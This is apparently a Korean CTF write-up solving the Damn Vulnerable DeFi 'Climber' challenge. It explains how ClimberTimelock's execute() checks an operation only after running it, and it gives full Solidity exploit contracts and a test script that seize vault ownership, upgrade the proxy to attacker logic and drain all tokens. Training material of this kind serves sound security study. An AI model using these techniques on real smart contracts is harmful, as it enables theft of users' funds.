<p>1000만개의 DTV 토큰을 보호하고 있는 Vault 컨트랙트(금고 역할)가 있으며, 해당 컨트랙트는 EIP-1822 UUPS 패턴에 따라 업그레이드가 가능한(Upgradeable) 형태이다.</p>
<p>Vault 컨트랙트의 현재 owner는 Timelock 컨트랙트이며, owner만이 withdraw()를 통해 아주 제한된 양(1 DTV)의 토큰만 출금이 가능하게 설계되어 있다.</p>
<p>또한 긴급상황에서 모든 토큰을 빼낼 수 있는 권한을 가진 추가적인 계정(Sweeper)도 있다.</p>
<p>Timelock 컨트랙트에서 Proposer 권한을 부여받은 계정만이 1시간 후에 실행할 수 있는 작업(Operation)을 schedule()을 통해 등록할 수 있다.</p>
<p>공격자는 Vault 컨트랙트의 모든 토큰을 가져오는 것이 목표이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// ClimberTimelock.sol
</span><span style="color:#75715e"></span>...
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getOperationState</span>(<span style="color:#66d9ef">bytes32</span> id) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (OperationState) {
    Operation <span style="color:#66d9ef">memory</span> op <span style="color:#f92672">=</span> operations[id];
    
    <span style="color:#66d9ef">if</span>(op.executed) {
        <span style="color:#66d9ef">return</span> OperationState.Executed;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(op.readyAtTimestamp <span style="color:#f92672">&gt;=</span> block.timestamp) {
        <span style="color:#66d9ef">return</span> OperationState.ReadyForExecution;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(op.readyAtTimestamp <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#66d9ef">return</span> OperationState.Scheduled;
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#66d9ef">return</span> OperationState.Unknown;
    }
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getOperationId</span>(
    <span style="color:#66d9ef">address</span>[] calldata targets,
    <span style="color:#66d9ef">uint256</span>[] calldata values,
    <span style="color:#66d9ef">bytes</span>[] calldata dataElements,
    <span style="color:#66d9ef">bytes32</span> salt
) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">pure</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bytes32</span>) {
    <span style="color:#66d9ef">return</span> keccak256(abi.encode(targets, values, dataElements, salt));
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">schedule</span>(
    <span style="color:#66d9ef">address</span>[] calldata targets,
    <span style="color:#66d9ef">uint256</span>[] calldata values,
    <span style="color:#66d9ef">bytes</span>[] calldata dataElements,
    <span style="color:#66d9ef">bytes32</span> salt
) <span style="color:#66d9ef">external</span> onlyRole(PROPOSER_ROLE) {        <span style="color:#75715e">// only PROPOSER can add operations.
</span><span style="color:#75715e"></span>    require(targets.length <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> targets.length <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>);
    require(targets.length <span style="color:#f92672">==</span> values.length);
    require(targets.length <span style="color:#f92672">==</span> dataElements.length);

    <span style="color:#66d9ef">bytes32</span> id <span style="color:#f92672">=</span> getOperationId(targets, values, dataElements, salt);
    require(getOperationState(id) <span style="color:#f92672">==</span> OperationState.Unknown, <span style="color:#e6db74">&#34;Operation already known&#34;</span>);
    
    operations[id].readyAtTimestamp <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint64</span>(block.timestamp) <span style="color:#f92672">+</span> delay;
    operations[id].known <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
}

<span style="color:#75715e">/** Anyone can execute what has been scheduled via `schedule` */</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execute</span>(
    <span style="color:#66d9ef">address</span>[] calldata targets,
    <span style="color:#66d9ef">uint256</span>[] calldata values,
    <span style="color:#66d9ef">bytes</span>[] calldata dataElements,
    <span style="color:#66d9ef">bytes32</span> salt
) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
    require(targets.length <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;Must provide at least one target&#34;</span>);
    require(targets.length <span style="color:#f92672">==</span> values.length);
    require(targets.length <span style="color:#f92672">==</span> dataElements.length);

    <span style="color:#66d9ef">bytes32</span> id <span style="color:#f92672">=</span> getOperationId(targets, values, dataElements, salt);

    <span style="color:#75715e">// Vulnerable! Execute -&gt; Validation Check
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// (1) Execute operation
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">uint8</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> targets.length; i<span style="color:#f92672">++</span>) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);       <span style="color:#75715e">// attacker -&gt; updateDelay, grantRole, transferOwnership, *schedule*
</span><span style="color:#75715e"></span>    }
    
    <span style="color:#75715e">// (2) Check that executed operation is valid
</span><span style="color:#75715e"></span>    require(getOperationState(id) <span style="color:#f92672">==</span> OperationState.ReadyForExecution);
    operations[id].executed <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
}
...
</code></pre></div><p>취약점은 <code>ClimberTimelock.sol</code>의 <code>execute()</code>에 존재한다.</p>
<p><strong><code>schedule()</code></strong></p>
<ul>
<li>PROPOSER_ROLE이 부여된 계정만이 실행 가능</li>
<li>targets / values / dataElements / salt 를 이용해 특정 operation을 식별할 수 있는 ID를 생성
<ul>
<li><strong>[] 리스트 형태로 일련의 작업들을 묶어서 실행 가능</strong></li>
</ul>
</li>
<li>실행할 operation ID의 readyAtTimestamp = 현재 timestamp(schedule에 추가된 시간) + 1 hour(delay)로 설정</li>
</ul>
<p><strong><code>execute()</code></strong></p>
<ul>
<li>PROPOSER_ROLE 권한을 가진 계정이 <code>schedule()</code>을 통해 추가한 operation을 ID를 기반으로 누구나 실행 가능한 것이 목적(..이지만 취약한 코드에 의해 누구나 operation 등록 및 실행이 가능)</li>
<li><strong>operation을 실행한 이후에, 해당 operation에 대한 ID 계산 및 scehdule 등록/적절 여부 판단</strong></li>
<li>공격자가 다음과 같은 operation 목록을 생성 및 실행하여, Logic 컨트랙트인 <code>ClimberVault</code>의 ownership 획득 가능
<ul>
<li>(1) ClimberTimelock::updateDelay(0)
<ul>
<li>공격자가 실행한 operation이 <code>require(getOperationState(id) == OperationState.ReadyForExecution);</code>를 우회할 수 있도록 하기위해 실행</li>
</ul>
</li>
<li>(2) AccessControl::grantRole(PROPOSER_ROLE, attacker_contract)
<ul>
<li>공격자가 생성한 컨트랙트에 PROPOSER_ROLE을 부여함으로써, <code>ClimberTimelock::schedule()</code>을 실행할 수 있는 권한 확보</li>
<li>공격자가 생성한 컨트랙트는 <code>ClimberVault</code> Logic 컨트랙트를 제어할 수 있는 권한 확보(PROPOSER_ROLE은 ADMIN_ROLE도 부여받음)</li>
</ul>
</li>
<li>(3) OwnableUpgradeable::transferOwnership(attacker_eoa)
<ul>
<li>UUPS 패턴으로 배포된 <code>ClimberVault</code> Logic 컨트랙트의 ownership을 공격자에게 이전 -&gt; <strong>공격자는 Logic 컨트랙트 업그레이드가 가능하도록 하는 권한 확보</strong></li>
</ul>
</li>
<li>(4) ClimberTimelock::schedule()
<ul>
<li>operation의 마지막에 schedule()을 호출함으로써, schedule에 operation 추가 및 <code>require(getOperationState(id) == OperationState.ReadyForExecution);</code> 우회</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="exploit-11">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-11">#</a></h3>
<p><strong>attacker-contracts/ClimberExploit.sol</strong></p>
<ul>
<li><code>ClimberTimelock</code>의 취약점을 이용하여 <code>ClimberVault</code>의 ownership 이전</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#75715e">//import &#34;@openzeppelin/contracts/access/AccessControl.sol&#34;;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IClimberTimelock</span> {
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">schedule</span>(<span style="color:#66d9ef">address</span>[] calldata targets, <span style="color:#66d9ef">uint256</span>[] calldata values, <span style="color:#66d9ef">bytes</span>[] calldata dataElements, <span style="color:#66d9ef">bytes32</span> salt) <span style="color:#66d9ef">external</span>;
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execute</span>(<span style="color:#66d9ef">address</span>[] calldata targets, <span style="color:#66d9ef">uint256</span>[] calldata values, <span style="color:#66d9ef">bytes</span>[] calldata dataElements, <span style="color:#66d9ef">bytes32</span> salt) <span style="color:#66d9ef">external</span>;
}

<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ClimberExploit</span> {
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> attackerEOA;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> timelockAddr;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> vaultAddr;

    <span style="color:#66d9ef">address</span>[] <span style="color:#66d9ef">public</span> targets;
    <span style="color:#66d9ef">uint256</span>[] <span style="color:#66d9ef">public</span> values;
    <span style="color:#66d9ef">bytes</span>[] <span style="color:#66d9ef">public</span> dataElements;

    <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">constant</span> PROPOSER_ROLE <span style="color:#f92672">=</span> keccak256(<span style="color:#e6db74">&#34;PROPOSER_ROLE&#34;</span>);

    <span style="color:#66d9ef">constructor</span> (<span style="color:#66d9ef">address</span> _attackerEOA, <span style="color:#66d9ef">address</span> _timelockAddr, <span style="color:#66d9ef">address</span> _vaultAddr) {
        attackerEOA <span style="color:#f92672">=</span> _attackerEOA;
        timelockAddr <span style="color:#f92672">=</span> _timelockAddr;
        vaultAddr <span style="color:#f92672">=</span> _vaultAddr;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#66d9ef">external</span> {
        <span style="color:#75715e">// updateDelay set to 0 
</span><span style="color:#75715e"></span>        targets.push(timelockAddr);
        values.push(<span style="color:#ae81ff">0</span>);
        dataElements.push(abi.encodeWithSignature(<span style="color:#e6db74">&#34;updateDelay(uint64)&#34;</span>, <span style="color:#66d9ef">uint64</span>(<span style="color:#ae81ff">0</span>)));

        <span style="color:#75715e">// Granting the PROPOSER role to this attacker contract(ClimberExploit.sol)
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// AccessControl.sol
</span><span style="color:#75715e"></span>        targets.push(timelockAddr);
        values.push(<span style="color:#ae81ff">0</span>);
        dataElements.push(abi.encodeWithSignature(<span style="color:#e6db74">&#34;grantRole(bytes32,address)&#34;</span>, PROPOSER_ROLE, <span style="color:#66d9ef">address</span>(this)));

        <span style="color:#75715e">// Transfer ownership of Logic Contract(ClimberVault) to attacker EOA
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// OwnableUpgradeable.sol
</span><span style="color:#75715e"></span>        targets.push(vaultAddr);
        values.push(<span style="color:#ae81ff">0</span>);
        dataElements.push(abi.encodeWithSignature(<span style="color:#e6db74">&#34;transferOwnership(address)&#34;</span>, attackerEOA));

        <span style="color:#75715e">// to bypass schedule check
</span><span style="color:#75715e"></span>        targets.push(<span style="color:#66d9ef">address</span>(this));
        values.push(<span style="color:#ae81ff">0</span>);
        dataElements.push(abi.encodeWithSignature(<span style="color:#e6db74">&#34;triggerSchedule()&#34;</span>));

        <span style="color:#75715e">// execute()
</span><span style="color:#75715e"></span>        IClimberTimelock(timelockAddr).execute(targets, values, dataElements, keccak256(<span style="color:#e6db74">&#34;salt&#34;</span>));
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">triggerSchedule</span>() <span style="color:#66d9ef">external</span> {
        <span style="color:#75715e">// triggering VaultTimelock::schedule()
</span><span style="color:#75715e"></span>        IClimberTimelock(timelockAddr).schedule(targets, values, dataElements, keccak256(<span style="color:#e6db74">&#34;salt&#34;</span>));
    }
}
</code></pre></div><p><strong>attacker-contracts/ClimberAttackerLogic.sol</strong></p>
<ul>
<li>UUPS 패턴으로 배포되어있는 <code>ClimberVault</code>를 아래 공격자의 Logic 컨트랙트로 업그레이드</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;

<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&#34;</span>;
<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&#34;</span>;
<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&#34;</span>;
<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span>;

<span style="color:#75715e">/**
</span><span style="color:#75715e"> * @title ClimberVault
</span><span style="color:#75715e"> * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
</span><span style="color:#75715e"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
</span><span style="color:#75715e"> */</span>
<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">ClimberAttackerLogic</span> <span style="color:#66d9ef">is</span> Initializable, OwnableUpgradeable, UUPSUpgradeable {

    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">constant</span> WITHDRAWAL_LIMIT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>;
    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">constant</span> WAITING_PERIOD <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span> <span style="color:#66d9ef">days</span>;

    <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">private</span> _lastWithdrawalTimestamp;
    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">private</span> _sweeper;

    <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlySweeper</span>() {
        require(msg.sender <span style="color:#f92672">==</span> _sweeper, <span style="color:#e6db74">&#34;Caller must be sweeper&#34;</span>);
        <span style="color:#66d9ef">_</span>;
    }

    <span style="color:#75715e">/// @custom:oz-upgrades-unsafe-allow constructor
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">constructor</span>() initializer {}

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initialize</span>() initializer <span style="color:#66d9ef">external</span> {
        <span style="color:#75715e">// Initialize inheritance chain
</span><span style="color:#75715e"></span>        __Ownable_init();
        __UUPSUpgradeable_init();

        <span style="color:#75715e">// Deploy timelock and transfer ownership to it
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//transferOwnership(address(new ClimberTimelock(admin, proposer)));
</span><span style="color:#75715e"></span>
        <span style="color:#75715e">//_setSweeper(sweeper);
</span><span style="color:#75715e"></span>        _setLastWithdrawal(block.timestamp);
        _lastWithdrawalTimestamp <span style="color:#f92672">=</span> block.timestamp;
    }

    ...

    <span style="color:#75715e">// Allows trusted sweeper account to retrieve any tokens
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sweepFunds</span>(<span style="color:#66d9ef">address</span> tokenAddress) <span style="color:#66d9ef">external</span> {
        IERC20 token <span style="color:#f92672">=</span> IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(<span style="color:#66d9ef">address</span>(this))), <span style="color:#e6db74">&#34;Transfer failed&#34;</span>);
    }
    
    ...

    <span style="color:#75715e">// By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_authorizeUpgrade</span>(<span style="color:#66d9ef">address</span> newImplementation) <span style="color:#66d9ef">internal</span> onlyOwner <span style="color:#66d9ef">override</span> {}
}
</code></pre></div><p><strong>climber.challenge.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// Change CimberVault&#39;s owner to attacker using vulnerability
</span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">exploitContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;ClimberExploit&#39;</span>, <span style="color:#a6e22e">attacker</span>)).<span style="color:#a6e22e">deploy</span>(<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">timelock</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vault</span>.<span style="color:#a6e22e">address</span>);
<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">exploitContract</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">exploit</span>();

<span style="color:#75715e">// Upgrade to attacker&#39;s Contract
</span><span style="color:#75715e"></span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">climberAttackerLogic</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;ClimberAttackerLogic&#39;</span>, <span style="color:#a6e22e">attacker</span>);
<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">attacker_vault</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">upgrades</span>.<span style="color:#a6e22e">upgradeProxy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vault</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">climberAttackerLogic</span>);

<span style="color:#75715e">// drained all tokens from vault
</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">attacker_vault</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">sweepFunds</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>);
</code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://inhack.github.io/tags/solidity/">solidity</a></li>
      <li><a href="https://inhack.github.io/tags/smart-contract/">smart contract</a></li>
      <li><a href="https://inhack.github.io/tags/security/">security</a></li>
      <li><a href="https://inhack.github.io/tags/defi/">DeFi</a></li>
      <li><a href="https://inhack.github.io/tags/wargame/">wargame</a></li>
      <li><a href="https://inhack.github.io/tags/ctf/">CTF</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://inhack.github.io/posts/solution-ethernaut/">
    <span class="title">« Prev</span>
    <br>
    <span>[Solution] Ethernaut</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on twitter"
        href="https://twitter.com/intent/tweet/?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&amp;hashtags=solidity%2csmartcontract%2csecurity%2cDeFi%2cwargame%2cCTF">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&amp;title=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;summary=%5bSolution%5d%20Damn%20Vulnerable%20DeFi&amp;source=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f&title=%5bSolution%5d%20Damn%20Vulnerable%20DeFi">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share [Solution] Damn Vulnerable DeFi on whatsapp"
        href="https://api.whatsapp.com/send?text=%5bSolution%5d%20Damn%20Vulnerable%20DeFi%20-%20https%3a%2f%2finhack.github.io%2fposts%2fsolution-damn-vulnerable-defi%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
